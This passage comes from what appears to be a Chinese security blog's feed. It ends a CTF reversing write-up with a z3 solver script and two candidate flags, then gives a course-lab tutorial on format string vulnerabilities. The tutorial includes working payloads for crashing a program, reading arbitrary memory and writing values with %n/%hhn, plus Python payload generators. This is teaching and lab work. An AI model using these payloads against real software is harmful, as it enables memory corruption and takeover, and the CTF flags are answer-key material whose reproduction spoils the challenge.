23 09 ; all[0x23] +=all[0x9]</span><br><span class="line">09 01 23 0b ; all[0x23] += 0xb</span><br><span class="line">11 02 08 23 ; if all[0x8] != all[0x23]</span><br><span class="line">0f 01 0c ; cmd +=0xc</span><br><span class="line"></span><br><span class="line">0a 02 24 0a ; all[0x24] +=all[0xa]</span><br><span class="line">0b 01 24 42 ; all[0x24] +=0x42</span><br><span class="line">12 02 08 24 ; if all[0x8] != all[0x24]</span><br><span class="line">10 01 10 ; cmd +=0x10</span><br><span class="line"></span><br><span class="line">0c 02 25 0c ; all[0x25] +=all[0xc]</span><br><span class="line">0d 02 25 0b ; all[0x25] +=all[0xb]</span><br><span class="line">05 02 25 08 ; all[0x25] -=all[0x8]</span><br><span class="line">13 01 25 67 ; if all[0x25] !=0x67</span><br><span class="line">11 01 18 ;cmd +=0x18</span><br><span class="line"></span><br><span class="line">0e 02 26 0c ; all[0x26] +=all[0xc]</span><br><span class="line">0f 02 26 0a ; all[0x26] +=all[0xa]</span><br><span class="line">06 02 26 09 ; all[0x26] -=all[0x9]</span><br><span class="line">10 02 27 0b ; all[0x27] +=all[0xb]</span><br><span class="line">07 01 27 29 ; all[0x27] -=0x29</span><br><span class="line">14 02 26 27 ; if all[0x26] !=all[0x27]</span><br><span class="line">12 01 f3 ; cmd +=0xf3</span><br><span class="line"></span><br><span class="line">11 01 27 29 ; all[0x27] +=0x29</span><br><span class="line">08 02 27 0a ; all[0x27] -=all[0xa]</span><br><span class="line">15 01 27 35 ; if all[0x27] !=0x35</span><br><span class="line">13 01 e4 ; cmd +=0xe4</span><br><span class="line"></span><br><span class="line">16 02 0e 13 ; if all[0xe] != all[0x13]</span><br><span class="line">14 01 dd ; cmd +=0xdd</span><br><span class="line"></span><br><span class="line">17 02 0f 12 ; if all[0xf] != all[0x12]</span><br><span class="line">15 01 d6 ; cmd +=0xd6</span><br><span class="line"></span><br><span class="line">18 02 10 07 ; if all[0x10] != all[0x7]</span><br><span class="line">16 01 cf ; cmd +=0xcf</span><br><span class="line"></span><br><span class="line">12 02 28 0d ; all[0x28] +=all[0xd]</span><br><span class="line">09 02 28 12 ; all[0x28] -=all[0x12]</span><br><span class="line">0a 02 28 11 ; all[0x28] -=all[0x11]</span><br><span class="line">19 01 28 00 ; if all[0x28] != 0</span><br><span class="line">17 01 bc ; cmd +=0xbc</span><br><span class="line"></span><br><span class="line">1a 05 11 12 ; if all[0x11] &gt;= all[0x12]</span><br><span class="line">18 01 b5 ; cmd +=0xb5</span><br><span class="line"></span><br><span class="line">1b 06 11 13 ; if all[0x11] &lt;=all[0x13]</span><br><span class="line">19 01 ae ; cmd +=0xae</span><br><span class="line"></span><br><span class="line">13 02 28 12 ; all[0x28] +=all[0x12]</span><br><span class="line">0b 02 28 13 ; all[0x28] -=all[0x13]</span><br><span class="line">1c 01 28 02 ; if all[0x28] !=0x2</span><br><span class="line">1a 01 9f ; cmd+=0x9f</span><br><span class="line"></span><br><span class="line">14 02 29 0d ; all[0x29] +=all[0xd]</span><br><span class="line">0c 01 29 36 ; all[0x29] -=0x36</span><br><span class="line">1d 02 29 0e ; if all[0x29] !=all[0x0e]</span><br><span class="line">1b 01 90 ; cmd +=0x90</span><br><span class="line"></span><br><span class="line">15 02 2a 13 ; all[0x2a] += all[0x13]</span><br><span class="line">02 01 2a 02 ; all[0x2a] *= 0x2</span><br><span class="line">1e 02 2a 17 ; if all[0x2a] != all[0x17]</span><br><span class="line">1c 01 81 ; cmd +=0x81</span><br><span class="line"></span><br><span class="line">1f 02 14 10 ; if all[0x14] != all[0x10]</span><br><span class="line">1d 01 7a ; cmd +=0x7a</span><br><span class="line"></span><br><span class="line">20 02 16 0a ; if all[0x16] != all[0x0a]</span><br><span class="line">1e 01 73 ; cmd +=0x73</span><br><span class="line"></span><br><span class="line">16 02 2b 15 ; all[0x2b] +=all[0x15]</span><br><span class="line">03 01 2a 02 ; all[0x2a] *=0x2 ==&gt; no use!</span><br><span class="line">03 01 2b 02 ; all[0x2b] /=0x2</span><br><span class="line">0d 01 2b 06 ; all[0x2b] -=0x6</span><br><span class="line">21 02 2b 16 ; if all[0x2b] != all[0x16]</span><br><span class="line">1f 01 5c ; cmd +=0x5c</span><br><span class="line"></span><br><span class="line">17 02 2c 19 ; all[0x2c] +=all[0x19]</span><br><span class="line">0e 02 2c 18 ; all[0x2c] -=all[0x18]</span><br><span class="line">22 01 2c 05 ; if all[0x2c] !=0x5</span><br><span class="line">20 01 4d ; cmd +=0x4d</span><br><span class="line"></span><br><span class="line">18 02 2d 19 ; all[0x2d] +=all[0x19]</span><br><span class="line">0f 02 2d 15 ; all[0x2d] -=all[0x15]</span><br><span class="line">23 01 2d 0b ; if all[0x2d] !=0xb</span><br><span class="line">21 01 3e ; cmd +=0x3e</span><br><span class="line"></span><br><span class="line">04 01 2a 02 ; all[0x2a] *=0x2</span><br><span class="line">04 01 2a 02 ; all[0x2a] /=0x2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 下面是输出部分，从0到0x1a输出内容，如果执行正确，应该会执行到这里</span><br><span class="line">04 00 04 01 04 02 04 03 04 04 04 05 04 06 04 07 04 </span><br><span class="line">08 04 09 04 0a 04 0b 04 0c 04 0d 04 0e 04 0f 04 </span><br><span class="line">10 04 11 04 12 04 13 04 14 04 15 04 16 04 17 04 </span><br><span class="line">18 04 19 04 1a </span><br></pre></td></tr></table></figure><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>根据上面的约束，直接写到z3里面即可。我这里写的太啰嗦了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_int</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> ArithRef(Z3_mk_bv2int(x.ctx_ref(), x.as_ast(), <span class="number">0</span>), x.ctx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    f5 = BitVec(<span class="string">&quot;f5&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f6 = BitVec(<span class="string">&quot;f6&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f7 = BitVec(<span class="string">&quot;f7&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f8 = BitVec(<span class="string">&quot;f8&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f9 = BitVec(<span class="string">&quot;f9&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    fa = BitVec(<span class="string">&quot;fa&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    fb = BitVec(<span class="string">&quot;fb&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    fc = BitVec(<span class="string">&quot;fc&quot;</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    fd = BitVec(<span class="string">&quot;fd&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    fe = BitVec(<span class="string">&quot;fe&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    ff = BitVec(<span class="string">&quot;ff&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f10 = BitVec(<span class="string">&quot;f10&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f11 = BitVec(<span class="string">&quot;f11&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f12 = BitVec(<span class="string">&quot;f12&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f13 = BitVec(<span class="string">&quot;f13&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f14 = BitVec(<span class="string">&quot;f14&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f15 = BitVec(<span class="string">&quot;f15&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f16 = BitVec(<span class="string">&quot;f16&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f17 = BitVec(<span class="string">&quot;f17&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f18 = BitVec(<span class="string">&quot;f18&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    f19 = BitVec(<span class="string">&quot;f19&quot;</span>,<span class="number">8</span>)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(f5+f7 == <span class="number">0xcc</span>)</span><br><span class="line">    solver.add(f5+f6+f7-<span class="number">0x64</span>==<span class="number">0xe1</span>)</span><br><span class="line">    solver.add(f6+f7 == <span class="number">0xd8</span>)</span><br><span class="line">    solver.add(f8==f9+<span class="number">0xb</span>)</span><br><span class="line">    solver.add(f8==fa+<span class="number">0x42</span>)</span><br><span class="line">    solver.add(fc + fb - f8 == <span class="number">0x67</span>)</span><br><span class="line">    solver.add(fc+fa-f9 == fb-<span class="number">0x29</span>)</span><br><span class="line">    solver.add(fb-fa == <span class="number">0x35</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(fe == f13)</span><br><span class="line">    solver.add(ff == f12)</span><br><span class="line">    solver.add(f10 == f7)</span><br><span class="line">    solver.add(fd-f12==f11)</span><br><span class="line">    solver.add(f11&lt;f12)</span><br><span class="line">    solver.add(f11&gt;f13)</span><br><span class="line">    solver.add(fd-<span class="number">0x36</span> == fe)</span><br><span class="line">    solver.add(f12-f13==<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    solver.add(<span class="number">2</span>*f13==f17)</span><br><span class="line">    solver.add(f14==f10)</span><br><span class="line">    solver.add((f15/<span class="number">2</span>)  == f16 + <span class="number">0x6</span>)</span><br><span class="line">    solver.add((f15/<span class="number">2</span>)*<span class="number">2</span> == f15)</span><br><span class="line">    solver.add(f16==fa)</span><br><span class="line">    solver.add(f19-f18 == <span class="number">0x5</span>)</span><br><span class="line">    solver.add(f19-f15 == <span class="number">0xb</span>)</span><br><span class="line">    <span class="keyword">if</span> solver.check() == z3.sat:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;can solve&quot;</span>)</span><br><span class="line">        m = solver.model()</span><br><span class="line">        <span class="comment"># a5 = int(str(m.evaluete(f5)))</span></span><br><span class="line">        a5 = m[f5].as_long()</span><br><span class="line">        a6 = m[f6].as_long()</span><br><span class="line">        a7 = m[f7].as_long()</span><br><span class="line">        a8 = m[f8].as_long()</span><br><span class="line">        a9 = m[f9].as_long()</span><br><span class="line">        aa = m[fa].as_long()</span><br><span class="line">        ab = m[fb].as_long()</span><br><span class="line">        ac = m[fc].as_long()</span><br><span class="line">        ad = m[fd].as_long()</span><br><span class="line">        ae = m[fe].as_long()</span><br><span class="line">        af = m[ff].as_long()</span><br><span class="line">        a10 = m[f10].as_long()</span><br><span class="line">        a11 = m[f11].as_long()</span><br><span class="line">        a12 = m[f12].as_long()</span><br><span class="line">        a13 = m[f13].as_long()</span><br><span class="line">        a14 = m[f14].as_long()</span><br><span class="line">        a15 = m[f15].as_long()</span><br><span class="line">        a16 = m[f16].as_long()</span><br><span class="line">        a17 = m[f17].as_long()</span><br><span class="line">        a18 = m[f18].as_long()</span><br><span class="line">        a19 = m[f19].as_long()</span><br><span class="line">        ans = <span class="string">&quot;&quot;</span></span><br><span class="line">        ans +=<span class="built_in">chr</span>(a5)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a6)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a7)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a8)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a9)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(aa)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(ab)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(ac)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(ad)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(ae)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(af)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a10)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a11)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a12)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a13)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a14)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a15)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a16)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a17)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a18)</span><br><span class="line">        ans +=<span class="built_in">chr</span>(a19)</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;can&#x27;t solve&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/hackpark2022-shiftycode/image-20220415171305002.png" alt="image-20220415171305002"></p><h2 id="多解问题"><a href="#多解问题" class="headerlink" title="多解问题"></a>多解问题</h2><p>注意到上面有一个除法操作。这里会产生多解问题。</p><p><img src="/2022/04/15/hackpark2022-shiftycode/unknown.png" alt="unknown"></p><p>这样会产生两种可能的解。</p><ol><li>flag{my_sh1fti35_453_n1fty}</li><li>flag{my_sh1fti35_453_o1fuz}</li></ol><p>后面询问了出题人，两种都算是可以了。</p>]]></content>
      
      
      <categories>
          
          <category> rev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>software-security-lab3</title>
      <link href="/2022/04/14/input_check_lab/"/>
      <url>/2022/04/14/input_check_lab/</url>
      
        <content type="html"><![CDATA[<p>《软件安全》课程实验3，格式化字符串实验</p><span id="more"></span><h1 id="input-check-lab"><a href="#input-check-lab" class="headerlink" title="input check lab"></a>input check lab</h1><h2 id="printf的实现"><a href="#printf的实现" class="headerlink" title="printf的实现"></a>printf的实现</h2><p>c语言中的参数个数不定函数。例如printf。实现方法如下。主要使用了va_list这个类型的数据结构。</p><p><img src="/2022/04/14/input_check_lab/image-20220421092738658.png" alt="image-20220421092738658"></p><p>首先是va_list。这是一个数据结构，指向当前需要寻找的位置，每次指向下一个栈的高地址位置。每次取四个byte并且返回回来。这就实现了在栈上放置可以控制的数量的参数之后访问。</p><h3 id="格式化字符串漏洞成因"><a href="#格式化字符串漏洞成因" class="headerlink" title="格式化字符串漏洞成因"></a>格式化字符串漏洞成因</h3><p>格式化字符串的成因就是：当用户可以控制printf的格式化字符串输入时，就可以借助printf提供的va_list对栈上数据的访问(以及修改效果)实现<strong>任意地址读写</strong>。下面举例说明。</p><p>我们编写以下函数作为示例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc ./test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">20</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们用gdb调试一下。在printf的地方下断点，如下图所示。</p><p><img src="/2022/04/14/input_check_lab/image-20220422195546290.png" alt="image-20220422195546290"></p><p>可以看到当我们输入<code>%p.%p.%p.%p</code>时，这便作为了格式化字符串传入printf。于是，printf将根据%p的含义，<strong>依次从栈上提取出四个地址输出</strong>。在我们本次的输入中，printf就将会输出上涂红色箭头指向的内容。这就能实现栈上数据任意地址读。</p><p>此外，还可以利用printf实现任意地址读。<strong>为了达成此目标，需要提前将要读的地址写入栈上，之后找到这个写入的地址在格式化字符串调用开始时所在的偏移位置。</strong></p><p>上面这句话的含义，我们用下面的图展示出来。这是我们调用printf时的栈帧。</p><p><img src="/2022/04/14/input_check_lab/image-20220422200734751.png" alt="image-20220422200734751"></p><p>我们的目的是<strong>打印我们能够控制的地址</strong>，但是我们可控的栈上数据(buf)可能在举例printf调用时栈很远的地方。这个地方能够储存一个我们可控的地址。</p><p>在上图中，我用aaaa表示这个地址。<strong>假设说我们知道aaaa和上图中格式化字符串参数之间的偏移，我们就能够通过足够的%s来控制输出aaaa地址中的内容。</strong>(printf提供了一种printf(%n$s)的方法来让程序员控制读取栈上第几个数据，n代表位置)</p><p>理解了上面的任意地址读，我们就很方便的可以实现任意地址写。主要思想还是类似的，<strong>由于我们能控制写的地址，我们可以使用printf提供的<code>%n</code>来往指定地址写入数据。</strong>好了，主要思想就是上面这些。接下来主要通过seed lab来做一下上面相关的实验。</p><h2 id="task1-crash"><a href="#task1-crash" class="headerlink" title="task1 crash"></a>task1 crash</h2><p>让程序crash的方法有很多。对于格式化字符串，<strong>我们只需要构造参数使得格式化字符串打印一个不可访问地址的内容即可</strong>。</p><p>我们构造的payload可以是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s.%s.%s.%s.%s.%s.%s.%s.%s</span><br></pre></td></tr></table></figure><p>只需要把上述内容发过去，<code>printf</code>就会试图连续的以字符串格式解析栈上数据为字符串然后输出。由于%s会访问不可读的内存(栈上存在NULL，不可访问)，在成segegv，因此出现程序crash。</p><p><img src="/2022/04/14/input_check_lab/image-20220421095025478.png" alt="image-20220421095025478"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><h3 id="partA"><a href="#partA" class="headerlink" title="partA"></a>partA</h3><p>这里让我们找到我们输入的参数被放在格式化字符串参数偏移什么地方的位置。也就是一开始对printf的介绍中的<code>aaaa</code>的位置。从下面这张图中可以找到对应位置。这个是第64位(黄色框框中的)。</p><p><img src="/2022/04/14/input_check_lab/image-20220421100429667.png" alt="image-20220421100429667"></p><p>理解上面输出的含义：这表示printf的buffer和当前调用printf的时地址之差为64个地址长度。在x32下也就是(64*4)</p><h3 id="partB"><a href="#partB" class="headerlink" title="partB"></a>partB</h3><p>这里让我们<strong>打印出一个特定地址的内存</strong>。所用的方法和partA类似，也是找到一个栈上数据和当前格式化字符串开始位置栈内容的偏移。</p><p>使用以下payload即可。主要是<strong>使用%64$s打印第64个参数的位置的内容信息</strong>。我们先把我们要打印的地址放在我们payload的0到4位，然后用<code>%64$s</code>来打印从printf开始栈上第64位的内容。这里根据上面partA也就是一开始输入的number中储存的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080b4008</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%64$s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是我们成功打印出来的内容。</p><p><img src="/2022/04/14/input_check_lab/image-20220421102435584.png" alt="image-20220421102435584"></p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><p>这里要求我们改一个确定地方的内存。在part2中我们已经做到能够读取特定地方内容。这里使用%x$n可以实现对对应位置修改数据。具体来说,payload为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">10</span>c%<span class="number">67</span>$naaa（<span class="number">0x080e5068</span>）</span><br></pre></td></tr></table></figure><p>对上面的内容做解释：注意到字符串<code>%10c%67$naaa</code>的长度是12，在32位下是3个地址长度。那么我们后面输入的想要修改的地址就是在栈上第67位(67=64+3)。<code>%10c</code>表示输出10个字符，默认是空格，<code>%67$n</code>表示<strong>以四字节的大小修改从当前格式化字符串buffer开始的位置开始偏移67位的地址</strong>。最后的三个aaa是为了补全到4字节对齐(因为后面要放地址)。</p><p>因此，上面payload的含义是往<code>0x080e5068</code>写入10，写入单位是4字节。完整的payload如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="number">12</span>:<span class="number">16</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line"><span class="comment"># content[4:8]  =  (&quot;abcd&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">r&quot;%10c%67$naaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">0</span>:<span class="number">0</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改后的目标地址数值如下图所示。</p><p><img src="/2022/04/14/input_check_lab/image-20220421104922421.png" alt="image-20220421104922421"></p><h3 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h3><p>这里要修改为5000。我们可以继续用上面的4字节写入，但是这样会导致一次写入5000byte数据，这对于网络传输而言是不友好的。因此我在这里尝试采用小字节写入。也就是<code>%x$hhn</code>。下面详细解释一下Payload。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">68</span>$n%<span class="number">80</span>c%<span class="number">69</span>$hhn(<span class="number">0x080e5068</span>)(<span class="number">0x080e5069</span>)</span><br></pre></td></tr></table></figure><p>考虑到0x5000的16进制小端法表示为\x00\x50\x00\x00。其中0x080e5068需要储存\x00，0x080e5069需要储存\x50，0x080e506a和0x080e506b需要储存\x00。</p><p>我们需要在<code>0x080e5068</code>位置以4byte为单位写上0，因此也就是前面一部分payload<code>%68$n</code>。之后的<code>%80c%69$hhn</code>表示在0x080e5069位置以单字节写入80，也就是16进制的0x50。完整的payload以及生成效果如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span 